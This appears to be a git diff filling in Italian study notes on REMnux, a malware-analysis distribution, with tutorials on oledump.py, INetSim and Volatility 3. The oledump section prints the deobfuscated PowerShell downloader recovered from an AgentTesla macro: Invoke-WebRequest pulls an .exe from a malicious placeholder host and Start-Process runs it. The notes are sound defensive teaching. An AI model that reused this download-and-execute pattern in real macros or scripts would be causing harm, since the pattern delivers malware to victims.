@@ -3,26 +3,171 @@ title: "REMnux"
 date: 2026-08-19 12:00:00 +0200
 categories: [Cyber Security 101]
 tags: [security-solutions, remnux]
-description: "..."
+description: "Analisi malaware in sicurezza"
 toc: true
 ---
 
-## Cos'è
-(2-3 righe, con parole semplici)
+## Cos'è REMnux
 
-## Come funziona
-(passo per passo, elenchi puntati)
+REMnux è una **distribuzione Linux** (una versione di Ubuntu) pensata apposta per **analizzare malware in sicurezza** — cioè studiare software dannoso per capire cosa fa, senza infettare il proprio computer principale.
 
-### Esempio pratico
-(comando + perché quel flag/parametro)
+Se troviamo un file sospetto (un allegato email malevolo, un file scaricato da un sito compromesso) e vogliamo capire cosa fa davvero, abbiamo due esigenze:
 
-## Un limite importante da conoscere
-(non "errori che ho fatto" — limiti oggettivi dello strumento/tecnica, alternative migliori)
+1. **Sicurezza** — non vogliamo eseguirlo/analizzarlo sul nostro computer normale, perché potrebbe davvero infettarlo
+2. **Strumenti giusti** — analizzare malware richiede software specializzato (decompilatori, tool per leggere formati di file particolari, strumenti di rete per simulare Internet) che normalmente non abbiamo già installato, e installarli/configurarli uno per uno richiederebbe ore
 
-## Utilizzo
-(prosa, non elenco: offensiva/difensiva se rilevante + perché conta in un assessment reale)
+REMnux risolve entrambi i problemi: è una **macchina virtuale già pronta** — la scarichiamo, la avviamo dentro un software di virtualizzazione (VirtualBox, VMware), e abbiamo un ambiente completamente **isolato** dal nostro computer reale, con **centinaia di strumenti di analisi malware già installati e configurati**, pronti all'uso — tra cui Volatility, YARA, Wireshark, oledump e INetSim.
 
----
-**Modulo:** Security Solutions
-**Room:** 
-**Data:**
+Vediamo ora tre strumenti specifici che ci vivono dentro, uno per uno.
+
+## oledump.py
+
+È uno strumento che serve per analizzare i file in formato OLE2.
+
+Molti attacchi arrivano via email con un allegato Word/Excel che sembra innocuo. Ma questi file possono contenere **macro** (piccoli script nascosti dentro il documento) che, se l'utente le abilita, eseguono codice malevolo — es. scaricano ed eseguono un virus.
+
+In particolare, i file OLE2 (Structured Storage / Compound File Binary Format — il formato usato dai vecchi `.doc`/`.xls`, e in parte anche dai nuovi `.docm`/`.xlsm`) sono un po' come uno "zip" che contiene diversi pezzi (testo, immagini, e — quello che interessa qui — le macro). `oledump.py` apre questo contenitore e mostra **cosa c'è dentro**, senza eseguire nulla, permettendo di leggere il codice della macro in totale sicurezza.
+
+**Esempio**
+
+```bash
+oledump.py agenttesla.xlsm
+```
+
+Questo comando stampa un elenco numerato di tutti gli stream dentro il file:
+
+```
+  1:       109 '\x01CompObj'
+  2:      4096 '\x05DocumentSummaryInformation'
+  4:       688 M   'VBA/ThisWorkbook'
+```
+
+L'indicatore **`M`** accanto a uno stream segnala che quello stream contiene una **macro** — è il primo indizio da cercare nell'output.
+
+Per leggere il contenuto di quello stream:
+
+```bash
+oledump.py agenttesla.xlsm -s 4
+```
+
+- **`-s 4`** — seleziona lo stream numero 4 (quello con la macro)
+
+L'output grezzo è spesso in formato **hex dump**, difficile da leggere. Aggiungendo il parametro **`--vbadecompress`**, oledump decomprime automaticamente il codice VBA compresso, rendendolo leggibile come testo normale:
+
+```bash
+oledump.py agenttesla.xlsm -s 4 --vbadecompress
+```
+
+Nel codice decompresso può comparire una variabile con contenuto **offuscato** (ad esempio caratteri `*` e `^` inseriti per confondere) — per ripulirlo si può incollare il valore dentro **CyberChef**, usando l'operazione **Find/Replace** per rimuovere quei caratteri di disturbo. Il risultato finale spesso rivela un comando PowerShell del tipo:
+
+```powershell
+Invoke-WebRequest -Uri http://indirizzo-malevolo/Doc-3737122pdf.exe -OutFile C:\Temp\file.exe
+Start-Process C:\Temp\file.exe
+```
+
+`Invoke-WebRequest` è il comando PowerShell più comune per scaricare file da Internet, seguito da `Start-Process` per eseguirlo — un pattern classico di macro-downloader.
+
+**In sintesi**: `oledump.py` fa vedere il contenuto nascosto di un documento Office senza doverlo aprire con Word, dove le macro potrebbero eseguirsi davvero.
+
+## INetSim
+
+È uno strumento che serve per simulare una rete internet.
+
+Molti malware, una volta eseguiti, cercano di **connettersi a Internet** — per scaricare altro codice malevolo, o per "telefonare a casa" e ricevere istruzioni da un server di comando e controllo (C2). Lasciare che il malware si connetta davvero a Internet durante l'analisi rischia due cose: che scarichi altro malware reale, e che avvisi l'attaccante che qualcuno lo sta analizzando.
+
+INetSim **finge di essere Internet** — simula i servizi più comuni (siti web, DNS, email, FTP) rispondendo alle richieste del malware con risposte finte ma plausibili. Il malware "crede" di essere connesso a Internet vero, ma sta parlando solo con questa simulazione, chiusa dentro il laboratorio isolato.
+
+**Configurazione iniziale**
+
+Prima di avviare INetSim, va configurato l'IP della macchina REMnux nel file di configurazione:
+
+```bash
+sudo nano /etc/inetsim/inetsim.conf
+```
+
+Cercare la riga `#dns_default_ip 0.0.0.0` e modificarla con l'IP reale della macchina REMnux (es. `dns_default_ip 10.10.180.204`), così le richieste DNS simulate puntano correttamente alla macchina che sta fingendo di essere Internet.
+
+**Avvio**
+
+```bash
+sudo inetsim
+```
+
+L'output mostra i servizi che partono e, in tempo reale, ogni richiesta ricevuta:
+
+```
+* dns_53_tcp_udp - started (PID 2341)
+* ftp_21_tcp - started (PID 2348)
+* http_80_tcp - started
+```
+
+A questo punto, dalla macchina target si può provare a scaricare un file passando per la simulazione:
+
+```bash
+sudo wget https://MACHINE_IP/second_payload.zip --no-check-certificate
+```
+
+(il flag `--no-check-certificate` è necessario perché INetSim, come visto in precedenza, usa un certificato self-signed)
+
+**Fermare la simulazione e leggere il report**
+
+Premendo **Ctrl+C**, INetSim si ferma e salva un report dettagliato di tutte le richieste ricevute, indicandone il percorso su disco. Il report (consultabile con `cat`) mostra dettagli come il **metodo HTTP** usato per ogni richiesta (es. `GET`), utile per ricostruire esattamente cosa il file sospetto ha provato a fare.
+
+**In sintesi**: INetSim crea una "Internet finta" dentro il laboratorio, così si può vedere cosa il malware prova a fare online, senza che nulla di reale accada.
+
+## Volatility 3 (vol3)
+
+È uno strumento che serve per analizzare la memoria RAM.
+
+Alcuni malware sono progettati per vivere solo nella **memoria RAM** di un computer infetto, senza mai scrivere un file vero sul disco — questo li rende invisibili se si guardano solo i file salvati. L'unico modo per scoprirli è catturare e analizzare il contenuto della RAM del sistema infetto in quel momento.
+
+Volatility 3 è lo strumento standard del settore per la **memory forensics**: prende un **dump della memoria RAM** (un file che contiene tutto quello che era in RAM in un dato momento) e permette di esplorarlo — quali programmi erano in esecuzione, quali connessioni di rete erano aperte, e persino trovare pezzi di malware nascosti che esistevano solo in memoria. Volatility non cattura la memoria, la **analizza dopo** che è già stata catturata (in una room come questa, il dump — es. `wcry.mem`, da un caso reale di ransomware WannaCry — viene fornito già pronto).
+
+**Vedere quali processi erano in esecuzione**
+
+```bash
+vol3 -f wcry.mem windows.pstree
+```
+
+Il plugin **`pstree`** mostra i processi in una struttura ad **albero padre-figlio**, utile per capire le relazioni tra processi (es. quale processo ne ha lanciato un altro). Un plugin alternativo più semplice è **`pslist`**:
+
+```bash
+vol3 -f wcry.mem windows.pslist
+```
+
+che restituisce un elenco piatto:
+
+```
+PID    PPID   ImageFileName
+4321   612    explorer.exe
+5560   4321   svchost.exe
+6102   5560   powershell.exe
+```
+
+Se un processo ha un nome sospetto, o è stato lanciato da un processo che normalmente non dovrebbe farlo, è già un primo indizio.
+
+**Cercare malware nascosto in un processo legittimo** (tecnica comune: il malware si "inietta" dentro un processo Windows normale per nascondersi)
+
+```bash
+vol3 -f wcry.mem windows.malfind
+```
+
+Il plugin **`malfind`** cerca automaticamente porzioni di memoria sospette — codice eseguibile in zone di memoria che normalmente non dovrebbero contenerne, un forte indicatore di code injection. L'output elenca i processi coinvolti in ordine, permettendo di identificare il primo, il secondo, e così via.
+
+**Estrarre testo leggibile dal dump**
+
+Oltre a Volatility, l'utility Linux di base **`strings`** è utile per estrarre sequenze di testo leggibile da qualsiasi file binario, incluse le immagini di memoria:
+
+```bash
+strings wcry.mem | grep -i "http"
+```
+
+Utile per trovare rapidamente URL, chiavi di registro o altre stringhe rilevanti senza dover interpretare l'intera struttura della memoria.
+
+**In sintesi**: Volatility 3 permette di "fare l'autopsia" alla memoria di un computer infetto, trovando processi, connessioni e persino malware che non hanno mai lasciato traccia su disco.
+
+## Osservazioni
+
+Ognuno di questi tre strumenti risponde a una domanda diversa, e nessuno da solo racconta l'intera storia: `oledump.py` mostra cosa il file *contiene* (analisi statica), INetSim mostra cosa il file *prova a fare in rete* quando viene eseguito, Volatility mostra cosa è rimasto *in memoria* dopo l'esecuzione. Analizzare solo uno di questi aspetti rischia di far perdere pezzi importanti — un malware potrebbe non mostrare nulla di sospetto nel documento stesso (oledump pulito), ma rivelarsi comunque dannoso solo osservando il traffico di rete generato o le tracce lasciate in memoria.
+
+Il flusso di analisi tipico su REMnux segue proprio questa sequenza a cascata: si apre un documento sospetto con `oledump.py` senza eseguirlo, per capire se contiene macro e cosa fanno; se la macro prova a scaricare qualcosa da Internet, si avvia INetSim per osservare quel traffico in sicurezza, eseguendo il file solo dentro l'ambiente simulato; se resta il sospetto che qualcosa si nasconda più in profondità (codice iniettato, processi anomali), si passa a Volatility 3 per analizzare un dump della memoria del sistema infetto. Avere tutti e tre gli strumenti nello stesso ambiente isolato è ciò che rende REMnux pratico per un'analisi end-to-end, senza dover configurare nulla da zero.
